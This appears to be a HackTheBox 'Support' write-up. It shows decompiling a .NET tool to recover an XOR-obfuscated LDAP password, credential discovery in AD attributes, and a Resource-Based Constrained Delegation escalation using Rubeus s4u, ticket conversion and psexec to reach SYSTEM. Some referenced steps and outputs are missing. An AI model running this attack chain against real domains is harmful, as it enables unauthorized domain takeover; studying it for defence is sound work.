Support is a **Windows Active Directory Domain Controller** — the AD port signature (53/88/389/445/636/3268/3269/9389) makes the role obvious before the first probe. SMB with NULL session lists shares including `support-tools`, which is anonymously readable and contains `UserInfo.exe.zip`. The extracted **.NET binary** decompiled with **ILSpy** exposes an `LdapQuery` constructor that binds to LDAP as `support\ldap` and a `Protected.getPassword()` function that XOR-decrypts an embedded base64 string against the key `armando` with a `0xDF` constant — reversing the XOR (which is symmetric) recovers the plaintext `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. Authenticated LDAP enumeration reveals the `info` field on the `support` user contains the password `Ironside47pleasure40Watchful` (a classic administrator note-to-self written into an LDAP attribute), giving WinRM access and the user flag. **BloodHound** collection shows `support` is a member of the `Shared Support Accounts` group, which has **GenericAll** on the DC — an ACL that unlocks a **Resource-Based Constrained Delegation** attack: create a controlled machine account via Powermad (the `MachineAccountQuota` default of 10 permits any authenticated user), set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC to trust that account, and use **Rubeus s4u** (S4U2self + S4U2proxy) to mint a Kerberos service ticket for `cifs/dc.support.htb` impersonating **Administrator**. The `.kirbi` ticket is converted to ccache with Impacket's `ticketConverter.py`, and `psexec.py -k -no-pass` gives a **NT AUTHORITY\SYSTEM** shell on the DC.

## Reconnaissance & Enumeration

The objective of this phase was to identify the machine's role and enumerate exposed services.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.65.16
PING 10.129.65.16 (10.129.65.16) 56(84) bytes of data.
64 bytes from 10.129.65.16: icmp_seq=1 ttl=127 time=43.6 ms
```

A TTL of **127** indicates a **Windows** host (default 128, decremented once across the routing hop). This is the first fingerprinting datum: Linux boxes typically return TTL 63 (from a default of 64); Windows returns TTL 127 (from a default of 128).

## Reverse Engineering — `UserInfo.exe` (.NET Assembly)

Unzipping revealed a .NET application with several DLL dependencies:

```bash
unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe
  inflating: CommandLineParser.dll
  inflating: Microsoft.Bcl.AsyncInterfaces.dll
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll

UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

The `Mono/.Net assembly` tag is the pivotal detail. .NET binaries are distributed as **CIL bytecode**, not native machine code — meaning they can be **decompiled almost losslessly** back to readable C# source. The standard tool is **ILSpy**, an open-source .NET decompiler that reconstructs the original source from the CIL, complete with class names, method signatures, and — critically — hardcoded string constants that appear as literal source.

Setting up ILSpy on Linux:

```bash
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-x64/
./ILSpy
```

Opening `UserInfo.exe` from `File → Open` loads the assembly and populates the tree view with all namespaces and types:

### The `LdapQuery` constructor — hardcoded credential and username

The constructor of `LdapQuery` reveals what the tool does under the hood:

![ILSpy showing the decompiled UserInfo.Services.LdapQuery class with the LdapQuery constructor binding to LDAP://support.htb using the identity "support\\ldap" and a password obtained from Protected.getPassword()](/assets/img/HTB/Support/cap2.png)

```csharp
public LdapQuery()
{
    string password = Protected.getPassword();
    entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
    entry.set_AuthenticationType((AuthenticationTypes)1);
    ds = new DirectorySearcher(entry);
}
```

Three data points from this method are immediately actionable:

1. **The LDAP endpoint** — `LDAP://support.htb` (matches the domain from nmap)
2. **The authenticating identity** — `support\ldap`, i.e., domain `SUPPORT` with sAMAccountName `ldap`. This is a **service account name that will exist in the domain** — half of a valid credential
3. **The password is dynamically computed** by `Protected.getPassword()`. Everything needed to recover it is inside the binary

### `Protected.getPassword()` — the XOR chain

Following the reference to `Protected.getPassword()`:

![ILSpy showing the decompiled UserInfo.Services.Protected.getPassword() function which base64-decodes enc_password and applies a double XOR against key and the constant 0xDFu, then returns the decoded string](/assets/img/HTB/Support/cap3.png)

```csharp
public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    byte[] array2 = array;
    for (int i = 0; i < array.Length; i++)
    {
        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    }
    return Encoding.Default.GetString(array2);
}
```

The routine is a double-XOR: each ciphertext byte is XORed with a rotating key byte, then XORed again with the constant `0xDF`, and the result is the plaintext byte. This looks intimidating on first read, but **XOR is its own inverse** — applying the exact same operation to the ciphertext yields the plaintext. The same routine is both the encryption and the decryption.

### The encrypted string and the key

Both operands of the XOR are hardcoded static fields on the `Protected` class:

![ILSpy showing the private static string field enc_password with a base64-encoded value "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"](/assets/img/HTB/Support/cap4.png)


![ILSpy showing the private static byte array key initialized as Encoding.ASCII.GetBytes("armando")](/assets/img/HTB/Support/cap5.png)

Everything needed to reverse the password is now visible: the base64 ciphertext, the key `armando`, and the XOR constant `0xDF`.

### Reversing the XOR

A short Python script mirroring the C# logic:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
CONST = 0xDF

def get_password(enc_b64: str, key: bytes, const: int) -> str:
    cifrado = base64.b64decode(enc_b64)
    claro = bytearray(len(cifrado))
    for i in range(len(cifrado)):
        claro[i] = (cifrado[i] ^ key[i % len(key)]) ^ const
    return claro.decode("utf-8", errors="replace")

if __name__ == "__main__":
    print(f"[+] Password: {get_password(enc_password, key, CONST)}")
```

Running it:

```bash
python3 xor.py
[+] Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The **`info`** attribute contains `Ironside47pleasure40Watchful` — the exact shape of an administrator-generated password (three concatenated words with digits). Two membership entries matter for later: **`Shared Support Accounts`** (a custom group we'll return to during BloodHound analysis) and **`Remote Management Users`** (the built-in group whose members can authenticate over WinRM on 5985).

### The `Shared Support Accounts` group has `GenericAll` on the DC

Clicking `SUPPORT@SUPPORT.HTB` and opening the **Node Info** panel reveals the account's outbound object controls — the ACLs the user has (either directly or through group membership) over other objects in the domain:

`Group Delegated Object Control: 1`. Expanding it shows the specific path: **`Shared Support Accounts` group** has a **`GenericAll`** edge to the **DC computer object**. And support is a member of `Shared Support Accounts`. Transitively: support has full control over the domain controller.

**`GenericAll`** is the most permissive AD ACL. It grants the equivalent of every specific right combined — reset the target's password, add SPNs, modify group memberships, delete the object, and — most importantly for this chain — write to the target's own attributes, including `msDS-AllowedToActOnBehalfOfOtherIdentity`. That last attribute is the entire pivot into Resource-Based Constrained Delegation.

## Privilege Escalation — Resource-Based Constrained Delegation

### Understanding RBCD

Kerberos has two "S4U" (Service-for-User) extensions:

- **S4U2self** — a service can request a service ticket for itself, impersonating any user. This exists so a web frontend can obtain a Kerberos identity for a user who has authenticated by some non-Kerberos means (a form login, a smart card, etc.) and then use that identity against downstream services.
- **S4U2proxy** — a service can convert an S4U2self ticket for user X into a service ticket that user X would use to authenticate to a *different* service. This is the "delegation" part: the frontend service can act on behalf of the user against a backend.

In "traditional" constrained delegation, the list of services a given service can delegate to is stored on the **frontend** account (in `msDS-AllowedToDelegateTo`). Configuring this attribute requires `SeEnableDelegationPrivilege` — practically, only Domain Admins. This is the strict version.

**Resource-Based Constrained Delegation (RBCD)** inverts the direction: the list of accounts allowed to delegate *to* a service is stored on the **target** account (in `msDS-AllowedToActOnBehalfOfOtherIdentity`). Setting this attribute requires only write access to the target — which is exactly what `GenericAll` grants.

The attack sequence:

1. Create or take control of a machine account with an SPN — call it `Monre$`.
2. Add `Monre$`'s SID to the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity`, telling the KDC "`Monre$` is allowed to delegate to me".
3. As `Monre$`, request an S4U2self ticket to `Monre$` impersonating `Administrator`.
4. As `Monre$`, use S4U2proxy to exchange that ticket for a service ticket to `cifs/dc.support.htb` — still as `Administrator`.
5. Use the resulting ticket to authenticate to the DC's SMB service (which the `cifs/` SPN represents) as `Administrator` and pop a shell.


`983551` is the numeric representation of full-control access; `S-1-5-21-...-6102` matches the SID of `Monre$` from the earlier `Get-ADComputer` output. RBCD is armed.

### Computing the NT hash of the machine account

Rubeus needs the NT hash of `Monre$`'s password to issue the initial TGT request. There are two ways to compute it — natively via `Rubeus.exe hash` (offline mode), or via Python's `passlib.hash.nthash`. Both produce identical results:

```bash
python3 -c 'from passlib.hash import nthash; print(nthash.hash("Monre123"))'
e4fbbc42d313656d830c386d4b433e79
```

Cross-verification with Rubeus:

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe hash /password:Monre123 /user:Monre$ /domain:support.htb
[*] Action: Calculate Password Hash(es)
[*] Input password             : Monre123
[*]       rc4_hmac             : E4FBBC42D313656D830C386D4B433E79
[*]       aes128_cts_hmac_sha1 : 2A358DC9CB25D6508CD79527BF5AA943
[*]       aes256_cts_hmac_sha1 : 607F4C6BD91288D4F7254CD4D037D8289E6E6DED71A7F685596ED7EB3C35A97D
```

The `rc4_hmac` value **IS** the NT hash. Same `e4fbbc42d313656d830c386d4b433e79` — the NT hash algorithm is unsalted MD4(unicode(password)), so any two computations against the same plaintext produce the same hash.

### Rubeus S4U — the full Kerberos dance

`Rubeus.exe s4u` executes the entire delegation dance in one invocation:

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe s4u /user:Monre$ /rc4:E4FBBC42D313656D830C386D4B433E79 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

[*] Action: S4U
[*] Using rc4_hmac hash: E4FBBC42D313656D830C386D4B433E79
[*] Building AS-REQ (w/ preauth) for: 'support.htb\Monre$'
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIFSDCCBUSgAwIBBaEDAgEWooIEYjCCBF5hggRaMIIEVqADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      [...]

[*] Building S4U2self request for: 'Monre$@SUPPORT.HTB'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'Monre$@SUPPORT.HTB'

[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
      doIGYDCCBlygAwIBBaEDAgEWooIFcjCCBW5hggVqMIIFZqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD

```

Three tickets are emitted in order:

1. **TGT for `Monre$`** — obtained via AS-REQ using the NT hash for pre-authentication. This is Rubeus's own authentication.
2. **S4U2self TGS** — a service ticket to `Monre$@SUPPORT.HTB` for user `Administrator`. This isn't directly useful (it's a ticket to Monre$, not to the DC), but it's the input to the next step.
3. **S4U2proxy TGS for `cifs/dc.support.htb`** — the payload. A service ticket to the DC's SMB service, appearing to come from `Administrator`. This is what unlocks the DC.

The `/ptt` flag imported the ticket into Rubeus's own session (useful if running Rubeus on a Windows box that already has the psexec-equivalent). But since psexec.py runs on the Linux attacker side, the ticket needs to be exported and converted.

### From Rubeus `.kirbi` to Impacket `.ccache`

Rubeus outputs the ticket in `.kirbi` format — the native Windows Kerberos ticket file format. Impacket's tools speak `.ccache`, the MIT Kerberos credentials cache format. Impacket ships a converter:

```bash
git clone https://github.com/fortra/impacket.git
python3 -m venv .venv && source .venv/bin/activate
pip install impacket

# Copy the last (S4U2proxy) base64 blob from the Rubeus output into ticket.kirbi.b64
# then base64-decode it:
base64 -d ticket.kirbi.b64 > ticket.kirbi

python3 impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
Impacket v0.13.1 - Copyright Fortra, LLC
[*] converting kirbi to ccache...
[+] done
```

### `psexec.py -k -no-pass` → NT AUTHORITY\SYSTEM

The final step. Impacket's `psexec.py` uploads a service binary to the target's `ADMIN$` share, registers it as a Windows service, and starts it — producing an interactive shell as `NT AUTHORITY\SYSTEM`. With `-k`, the authentication is Kerberos-based (reading the credentials from `KRB5CCNAME`); `-no-pass` skips password prompting since the ticket is the credential:


## Key Takeaways

- **The AD port signature (53/88/389/636/3268/3269/9389 + high-numbered RPC ports) is a Domain Controller fingerprint.** On a Windows target, the presence of all of these together is the operational shorthand for "this is a DC" — the specific role that hosts every principal in the domain, every ACL, every Kerberos key. The recon phase against a Windows target should include a mental checkbox for this pattern; when it matches, the mental model of the engagement shifts from "compromise this host" to "abuse this domain".
- **NULL-session share listing is still Windows Server 2022's default.** Even with SMB signing required and SMBv1 disabled, `smbclient -N` enumerates the share catalogue. Custom shares (anything outside `ADMIN$/C$/IPC$/NETLOGON/SYSVOL`) are worth checking anonymously — `support-tools` here was reachable without credentials. The `restrict anonymous` hardening exists but is rarely deployed.
- **.NET assemblies are effectively source code.** Decompilers like ILSpy, dnSpy, and dotPeek reconstruct near-original C# from CIL bytecode, including hardcoded strings, method names, and control flow. Any secret embedded in a .NET binary is a secret published to anyone who obtains the binary. "Custom obfuscation" via XOR, base64, or reversal — as in `UserInfo.exe` here — is entirely defeated by reading the decompiled source. The correct pattern for storing secrets in .NET applications is to load them from an external secret store (DPAPI, Windows Credential Manager, Azure Key Vault); the wrong pattern is to write your own scheme in a decompilable binary.
- **XOR is symmetric and reversible.** Any password-obfuscation scheme built on XOR — with a hardcoded key, with a rotating key, with a constant XOR mixed in — is trivially reversible by reading the encoding routine and running the exact same operation on the ciphertext. The apparent complication of "two XORs in sequence" doesn't add security; it's the same as one XOR with a computable key. If a scheme's decryption function is `f^-1 = f`, an attacker with the ciphertext and the code recovers the plaintext with no cryptanalysis at all.
- **The LDAP `info` attribute is an unrestricted free-text credential leak.** Every user object in AD has an `info` attribute intended for arbitrary notes — job responsibilities, phone extensions, on-call rotation notes. It's readable by any authenticated user with default LDAP permissions. Administrators putting passwords into it — as with the `support` user's `Ironside47pleasure40Watchful` — is a recurring anti-pattern. The blue-team check is `Get-ADUser -Filter * -Properties info | Where-Object {$_.info -ne $null}`; the red-team check is `ldapsearch ... '(info=*)'`. Both work equally well.
- **BloodHound turns AD from a graph of "principals and permissions" into a graph of "start here to reach there".** The value of BloodHound isn't listing ACLs — that's what LDAP already does — but computing transitive paths through group memberships, delegated ACLs, and object-control edges. Marking any principal as owned reveals every path that starts from them, and the tool's built-in help panels document the exploitation primitive for each edge type. This is the single largest quality-of-life difference between AD engagements before and after 2016.
- **`GenericAll` on a computer object is Resource-Based Constrained Delegation.** GenericAll grants write access to every attribute of the target, including `msDS-AllowedToActOnBehalfOfOtherIdentity`. Setting this attribute to any account under attacker control converts the write primitive into full Kerberos impersonation against the target's services. When any BloodHound path terminates at "GenericAll on a computer", the exploit shape is fixed: create/control a machine account, set the delegation attribute, use S4U2self+S4U2proxy to mint an Administrator ticket.
- **`ms-DS-MachineAccountQuota` is 10 by default, and any authenticated user can add machine accounts.** This is the enabler for every RBCD attack — without it, an attacker without existing machine-account control cannot create the "principal I control" that RBCD requires. Setting the quota to 0 (via `Set-ADDomain -Replace @{'ms-DS-MachineAccountQuota'=0}`) is a straightforward hardening step that closes off the entire RBCD attack class for non-privileged users. Very few environments do it.
- **S4U2self is not a vulnerability; S4U2proxy against an attacker-controlled `msDS-AllowedToActOnBehalfOfOtherIdentity` is.** The S4U extensions exist for legitimate reasons — web frontends impersonating users against backend services after non-Kerberos authentication. What turns them into a privilege escalation is the ability to write the "who can invoke S4U2proxy against me" list on a high-value target. The correct defensive framing is that write access to any account's delegation-related attributes is equivalent to persistent impersonation rights over that account.
- **Rubeus `.kirbi` ↔ Impacket `.ccache` conversion is the standard cross-platform Kerberos-ticket bridge.** Windows tools (Rubeus, Mimikatz) produce `.kirbi`; Linux tools (Impacket) consume `.ccache`. `ticketConverter.py` is a lossless format converter, and setting `KRB5CCNAME` in the environment tells any MIT-Kerberos-linked binary (including Impacket examples) to use the imported ticket as its authentication. The two-toolchain workflow — enumerate and mint on Windows, deliver from Linux — is the operational shape of a large fraction of modern AD engagements.
- **`psexec.py -k -no-pass` is the SYSTEM-shell terminal state of an AD chain.** Once a valid Kerberos ticket for `cifs/target` as any Administrator-equivalent principal is available, Impacket's `psexec.py` uploads a service binary via the target's `ADMIN$` share, registers it, and starts it — spawning an interactive shell as `NT AUTHORITY\SYSTEM`. This is the standard "cash in the ticket" step: no additional exploits, no privilege elevation on the target, just Kerberos-authenticated service creation on a DC where SMB signing is enabled and required (because that's fine when the client possesses a valid ticket).
